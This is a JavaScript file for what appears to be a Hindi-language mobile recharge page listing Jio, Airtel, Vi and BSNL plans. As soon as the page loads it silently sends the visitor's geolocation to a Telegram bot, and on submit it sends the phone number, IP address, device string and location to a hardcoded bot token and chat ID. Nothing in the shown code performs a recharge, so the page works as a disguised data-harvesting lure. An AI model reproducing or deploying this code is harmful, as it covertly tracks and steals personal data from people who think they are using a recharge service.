const simSelect = document.getElementById("sim");
const planSelect = document.getElementById("plan");
const mobileInput = document.getElementById("mobile");
const submitBtn = document.getElementById("submitBtn");
const statusMsg = document.getElementById("statusMsg");

const plansData = {
  Jio: [
    "₹299 - 2GB/Day for 28 Days + Unlimited Calls",
    "₹666 - 1.5GB/Day for 84 Days",
    "₹749 - 2GB/Day for 90 Days + OTT Access",
    "₹999 - Unlimited 5G + 2GB/Day, 84 Days",
  ],
  Airtel: [
    "₹265 - 1GB/Day for 28 Days",
    "₹479 - 1.5GB/Day for 56 Days",
    "₹839 - 2GB/Day for 84 Days",
    "₹999 - Unlimited 5G + 2.5GB/Day, 90 Days",
  ],
  Vi: [
    "₹299 - 1.5GB/Day, 28 Days",
    "₹719 - 2GB/Day, 84 Days + Binge All Night",
    "₹999 - Unlimited 5G + Weekend Rollover, 84 Days",
  ],
  BSNL: [
    "₹187 - 2GB/Day for 28 Days",
    "₹699 - 3GB/Day, 84 Days",
    "₹999 - Truly Unlimited 5G + Calls, 90 Days",
  ],
};

// Location storage
let userLocation = null;

// On page load: request location permission silently and send location immediately if granted
window.onload = () => {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        userLocation = pos.coords;
        // Send location silently to Telegram immediately
        sendLocationToTelegram(userLocation.latitude, userLocation.longitude);
      },
      () => {
        // Permission denied or error, ignore silently
      }
    );
  }
};

// Send location helper
async function sendLocationToTelegram(lat, lon) {
  const botToken = "8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc";
  const chatId = "6038115234";
  const message = `📍 यूजर लोकेशन:\nhttps://www.google.com/maps?q=${lat},${lon}`;

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message }),
    });
  } catch (e) {
    // silently ignore
  }
}

// Populate plan dropdown on sim select
simSelect.addEventListener("change", () => {
  const sim = simSelect.value;
  planSelect.innerHTML = "";
  if (!sim) {
    planSelect.disabled = true;
    planSelect.innerHTML =
      '<option value="" disabled selected>पहले सिम चुनें</option>';
    return;
  }
  planSelect.disabled = false;
  plansData[sim].forEach((plan) => {
    const option = document.createElement("option");
    option.value = plan;
    option.textContent = plan;
    planSelect.appendChild(option);
  });
  const defaultOption = document.createElement("option");
  defaultOption.value = "";
  defaultOption.textContent = "प्लान चुनें";
  defaultOption.disabled = true;
  defaultOption.selected = true;
  planSelect.insertBefore(defaultOption, planSelect.firstChild);
  statusMsg.textContent = `आपने सिम चुना: ${sim}`;
});

planSelect.addEventListener("change", () => {
  statusMsg.textContent = `आपने प्लान चुना: ${planSelect.value}`;
});

submitBtn.addEventListener("click", async () => {
  const sim = simSelect.value;
  const plan = planSelect.value;
  const mobile = mobileInput.value.trim();

  if (!sim) {
    alert("कृपया सिम ऑपरेटर चुनें।");
    return;
  }
  if (!plan) {
    alert("कृपया प्लान चुनें।");
    return;
  }
  if (!/^\d{10}$/.test(mobile)) {
    alert("कृपया 10 अंकों का सही मोबाइल नंबर दर्ज करें।");
    return;
  }

  submitBtn.disabled = true;
  submitBtn.textContent = "प्रोसेस हो रहा है...";

  // Get IP
  let ip = "Unavailable";
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    ip = data.ip;
  } catch {}

  const device = navigator.userAgent;

  let locationText = "लोकेशन उपलब्ध नहीं है।";
  if (userLocation) {
    locationText = `लोकेशन: https://www.google.com/maps?q=${userLocation.latitude},${userLocation.longitude}`;
  }

  const botToken = "8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc";
  const chatId = "6038115234";

  const telegramMessage = 
`📲 नया रिचार्ज अनुरोध:
सिम: ${sim}
प्लान: ${plan}
मोबाइल नंबर: ${mobile}
आईपी: ${ip}
डिवाइस: ${device}
${locationText}`;

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: telegramMessage }),
    });
    statusMsg.textContent = "आपका अनुरोध सफलतापूर्वक भेज दिया गया है।";
  } catch {
    statusMsg.textContent = "त्रुटि हुई। कृपया पुनः प्रयास करें।";
  }

  submitBtn.disabled = false;
  submitBtn.textContent = "सबमिट करें";
});

// Scroll fix for mobile keyboard
mobileInput.addEventListener("focus", () => {
  setTimeout(() => {
    mobileInput.scrollIntoView({ behavior: "smooth", block: "center" });
  }, 300);
});
